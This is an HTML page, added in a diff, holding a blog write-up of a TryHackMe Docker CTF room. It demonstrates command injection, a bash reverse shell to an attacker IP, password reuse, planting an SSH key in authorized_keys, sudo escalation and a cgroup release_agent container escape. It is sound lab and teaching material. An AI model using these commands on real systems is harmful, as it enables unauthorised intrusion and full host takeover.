@@ -1,0 +1,201 @@
+<html>
+
+<head>
+    <title>USW Docker Event Write Up | JustineCybz</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+</head>
+
+<body>
+    <div id="menu">
+        
+        <h2>CTF Write-Ups</h2>
+        <p>Misc.</p>
+        <ul>
+            <li><a href="uswdockerevent.html">USW Docker Event</a></li>
+        </ul>
+        <p>Metasploit Community CTF 2021
+            <ul>
+                <li><a href="9spades.html">Port 20055 - 9 of Spades</a></li>
+                <li><a href="4clubs.html">Port 15010 - 4 of Clubs</a></li>
+            </ul>
+        </p>
+        <p>Hack The Box CTF 2020
+            <ul>
+                <li><a href="block.html">Hardware - Block</a></li>
+            </ul>
+
+        </p>
+    </div>
+    <div id="container">
+<h1>USW Docker Event</h1>
+<h2 id="introduction">Introduction</h2>
+<p>We were fortunate enough to be visited by <a href="https://rushisec.net/">rushisec</a> and <a href="https://sec.stealthcopter.com/">stealthcopter</a> to give an overview of Docker, plus a Docker-based CTF for us to participate in. I found it to be a really enjoyable challenge, and quite interesting being based around container escapes.</p>
+<p>Challenge: USW Docker Event</p>
+<p>Creators: <a href="https://rushisec.net/">rushisec</a>, <a href="https://sec.stealthcopter.com/">stealthcopter</a></p>
+<p>Platform: Try Hack Me</p>
+<p>URL: <a href="http://tryhackme.com/jr/uswdockerevent">http://tryhackme.com/jr/uswdockerevent</a></p>
+<p>After accessing the room on Try Hack Me at the above URL and clicking “Start Machine”, once the machine has loaded, you are presented with the IP address.</p>
+<p>Navigating to the provided IP address in the attacking machine’s browser presents you with a website which allows you to check for available domains. This feature is quite interesting. How does it check for domains? Where does it pass the inputted data?</p>
+<p>Starting the input with a semi-colon <code>;</code> and adding the bash command <code>ls</code> confirms that this feature is using bash to perform domain lookups. This can be exploited to provide us with extra information such as the /etc/passwd file, or to execute a reverse shell on the webserver.</p>
+<h2 id="web-app-shell-flag-1">Web App Shell &amp; Flag 1</h2>
+<blockquote>
+<p>What is the value found in /flag1.txt on the initial &quot;webapp&quot; container?</p>
+</blockquote>
+<p>A netcat listener was created on the attacking machine:</p>
+<pre><code class="lang-bash">root@ip<span class="hljs-string">-10</span><span class="hljs-string">-10</span><span class="hljs-string">-223</span><span class="hljs-string">-208</span>:~# nc -lvnp 443
+Listening on [0.0.0.0] (family 0, port 443)
+</code></pre>
+<p>A <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">bash reverse shell</a> was added to the input.</p>
+<p><code>;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.223.208/443 0&gt;&amp;1&#39;</code></p>
+<p>When the command is submitted on the website, the attacker’s netcat listener receives the connection and opens a shell:</p>
+<pre><code class="lang-bash">Connection <span class="hljs-built_in">from</span> <span class="hljs-number">10.10</span><span class="hljs-number">.209</span><span class="hljs-number">.31</span> <span class="hljs-number">35464</span> received!
+bash: cannot <span class="hljs-built_in">set</span> terminal <span class="hljs-built_in">process</span> group (<span class="hljs-number">1</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device
+bash: no job control <span class="hljs-keyword">in</span> this <span class="hljs-built_in">shell</span>
+root@webapp:/app<span class="hljs-comment">#</span>
+</code></pre>
+<p>Typing <code>ls</code> to check the files in the current directory for the flag does not provide.</p>
+<pre><code class="lang-bash">/app<span class="hljs-comment"># ls</span>
+ls
+__pycache__
+app.py
+db.py
+requirements.txt
+static
+templates
+root@<span class="hljs-symbol">webapp:</span>/app<span class="hljs-comment"># cd ..</span>
+cd ..
+root@<span class="hljs-symbol">webapp:</span>/<span class="hljs-comment"># ls</span>
+ls
+app
+bin
+boot
+dev
+etc
+flag1.txt
+home
+<span class="hljs-class"><span class="hljs-keyword">lib</span></span>
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+</code></pre>
+<p>The flag file appears to be in the preceeding folder. Read this file using <code>cat flag1.txt</code> to receive the first flag!</p>
+<h2 id="db-shell-flag-2">DB Shell &amp; Flag 2</h2>
+<blockquote>
+<p>What is the value found in /flag2.txt on the second container, &quot;mysql&quot;?</p>
+</blockquote>
+<p>When looking through the files in the previous folder /app, there was a file called ‘db.py’. This file contained plaintext credentials for a mysql server. Attempting to connect to the mysql server using <code>mysql -h db -u root -p NiftySkyPlantedWorry</code> unfortunately does not work. What if we were to try these credentials for another service instead, such as SSH? It is common for lazy administrators to reuse the same passwords for multiple services, so it’s worth a shot?</p>
+<pre><code class="lang-bash">root@webapp<span class="hljs-symbol">:/app</span><span class="hljs-comment"># ssh root<span class="hljs-doctag">@db</span></span>
+ssh root@db
+Pseudo-terminal will <span class="hljs-keyword">not</span> be allocated because stdin is <span class="hljs-keyword">not</span> a terminal.
+Host key verification failed.
+</code></pre>
+<p>OK, that didn’t quite work. The shell seems to need upgrading first. This can be done using Python within the terminal. As there are Python files already inside this folder, it’s safe to say that Python is likely installed.</p>
+<pre><code class="lang-python"><span class="hljs-keyword">python</span> -c <span class="hljs-string">"import pty;pty.spawn('/bin/bash');"</span>
+</code></pre>
+<p>Using this command successfully upgrades the shell.</p>
+<pre><code class="lang-python">root@webapp:/app<span class="hljs-meta"># ssh root@db</span>
+ssh root@db
+The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-comment">'db (172.19.0.4)' can't be established.</span>
+ECDSA <span class="hljs-keyword">key</span> fingerprint <span class="hljs-keyword">is</span> SHA256:JPHo4WFZ6o8hA7rNF+<span class="hljs-number">7</span>ZVSp/hLT8JMR5YnbiC7Z10v4.
+Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span> connecting (yes/no/[fingerprint])? yes
+yes
+Warning: Permanently added <span class="hljs-comment">'db,172.19.0.4' (ECDSA) to the list of known hosts.</span>
+root@db<span class="hljs-comment">'s password: NiftySkyPlantedWorry</span>
+
+Linux db <span class="hljs-number">5.4</span><span class="hljs-number">.0</span><span class="hljs-number">-104</span>-generic <span class="hljs-meta">#118-Ubuntu SMP Wed Mar 2 19:02:41 UTC 2022 x86_64</span>
+
+The programs included <span class="hljs-keyword">with</span> the Debian GNU/Linux system are free software;
+the exact distribution terms <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> program are described <span class="hljs-keyword">in</span> the
+individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes <span class="hljs-keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="hljs-keyword">to</span> the extent
+permitted <span class="hljs-keyword">by</span> applicable law.
+root@db:~<span class="hljs-meta">#</span>
+</code></pre>
+<p>Trying <code>ssh root@db</code> again is now successful, and the password from the <a href="http://db.py">db.py</a> file is correct.</p>
+<p>Typing <code>ls</code> again on entry does not provide a flag. Navigate to the preceeding folder using <code>cd ..</code> and <code>ls</code> again to find flag2.txt. <code>cat flag2.txt</code> to retrieve the 2nd flag!</p>
+<h2 id="proxy-shell-flag-3">Proxy Shell &amp; Flag 3</h2>
+<blockquote>
+<p>What is the value found in /flag3.txt on the third container, &quot;proxy&quot;?</p>
+</blockquote>
+<p>There is an interesting directory at <code>/opt/webby-home/</code> . This sounds like a user’s home folder and likely mounted from another host. Using the <code>findmnt</code> command shows a list of mounted directories, with webby-home among them.</p>
+<pre><code class="lang-python">|--<span class="hljs-regexp">/opt/webby</span>-home
+|       <span class="hljs-regexp">/dev/mapper</span><span class="hljs-regexp">/ubuntu--vg-ubuntu--lv[/var</span><span class="hljs-regexp">/lib/docker</span><span class="hljs-regexp">/volumes/containers</span>_shared/_data]
+</code></pre>
+<p>After checking for hidden files and directories using <code>ls -lah</code>, an <code>.ssh</code> directory is present.</p>
+<p>This means, as current root on db, it is possible to add your own key to authorized_keys to allow for ssh connection to webby on their host machine from which this directory was mounted.</p>
+<p>To do this, type <code>ssh-keygen</code> to create a key. When asked where to save the file, give the file a name such as <strong>key</strong>.</p>
+<p>Two files will be created, a private key “key” and a public key “key.pub”.</p>
+<p><code>cat [key.pub](http://key.pub) &gt;&gt; authorized_keys</code> to add the public key to the authorized_keys file.</p>
+<p>The user <strong>webby</strong> at the host <strong>proxy</strong> can now be accessed through SSH, using the key generated previously.</p>
+<p><code>ssh -i key webby@proxy</code> </p>
+<p>On successful login, it’s time to find flag 3.</p>
+<pre><code class="lang-bash">webby<span class="hljs-variable">@proxy</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>ls
+ls
+webby<span class="hljs-variable">@proxy</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cd ..
+cd ..
+webby<span class="hljs-variable">@proxy</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>ls
+ls
+webby
+webby<span class="hljs-variable">@proxy</span><span class="hljs-symbol">:/home</span><span class="hljs-variable">$ </span>cd ..
+cd ..
+webby<span class="hljs-variable">@proxy</span><span class="hljs-symbol">:/</span><span class="hljs-variable">$ </span>ls
+ls
+bin   docker-entrypoint.d   flag3.txt  lib64  opt   run   sys  var
+boot  docker-entrypoint.sh  home       media  proc  sbin  tmp
+dev   etc                   lib        mnt    root  srv   usr
+</code></pre>
+<p><code>cat flag3.txt</code> to retrieve the flag,</p>
+<h2 id="proxy-root-flag-4">Proxy root &amp; flag 4</h2>
+<blockquote>
+<p>“What is the value found in /root/flag4.txt in the root directory of the third container, &quot;proxy&quot;?”</p>
+</blockquote>
+<p>webby is not the root user for this host. To access flag4 at /root we will need to escalate our privileges. Using <code>sudo -l</code> to check the sudo status of the current user shows that webby can in fact run all commands as sudo, without a password.</p>
+<pre><code class="lang-bash">sudo -l
+Matching Defaults entries <span class="hljs-keyword">for</span> webby on <span class="hljs-symbol">proxy:</span>
+    env_reset, mail_badpass,
+    secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>
+
+User webby may run the following commands on <span class="hljs-symbol">proxy:</span>
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> ALL
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> ALL
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> ALL
+    (ALL) <span class="hljs-symbol">NOPASSWD:</span> ALL
+</code></pre>
+<p>Due to this, it is simply a matter of <code>sudo su</code> to become root.</p>
+<pre><code class="lang-bash">sudo su
+root<span class="hljs-variable">@proxy</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># cd /root</span>
+root<span class="hljs-variable">@proxy</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># ls</span>
+flag4.txt
+</code></pre>
+<p><code>cat flag4.txt</code> to retrieve the flag.</p>
+<h2 id="host-machine-flag-5">Host machine &amp; flag 5</h2>
+<blockquote>
+<p>What is the value found in /flag5.txt on the host machine?</p>
+</blockquote>
+<p>To reach the host machine, a container escape will be needed. After researching container escapes on google, the following solution was found on <a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/">trailofbits</a>:</p>
+<pre><code class="lang-bash"><span class="hljs-comment"># spawn a new container to exploit via:</span>
+<span class="hljs-comment"># docker run --rm -it --privileged ubuntu bash</span>
+
+d=<span class="hljs-string">`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`</span>
+<span class="hljs-keyword">mkdir</span> -p $d/w;echo <span class="hljs-number">1</span> &gt;$d/w/notify_on_release
+t=<span class="hljs-string">`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`</span>
+touch /o; echo $t/c &gt;$d/release_agent;<span class="hljs-keyword">printf</span> <span class="hljs-string">'#!/bin/sh\nps &gt;'</span><span class="hljs-string">"$t/o"</span> &gt;<span class="hljs-regexp">/c;
+chmod +x /c</span>;sh -c <span class="hljs-string">"echo 0 &gt;$d/w/cgroup.procs"</span>;<span class="hljs-keyword">sleep</span> <span class="hljs-number">1</span>;cat /o
+</code></pre>
+<p>This proof of concept code runs the <code>ps</code> command on the host machine. However, flag 5 is required to complete this challenge. Therefore, <code>ps</code> in the script is replaced by <code>ls</code> to display the files.</p>
+<p>This is then pasted into the <code>root@proxy</code> shell, and the contents of the mounted directory of the host system is displayed. flag5.txt appears to be in this directory. Therefore, it is now possible to replace <code>ls</code> in the script with <code>cat flag5.txt</code> and again, paste the completed script into the <code>root@proxy</code> shell. Flag 5 has now been retrieved!</p>
+    </div>
+</body>
+
+</html>
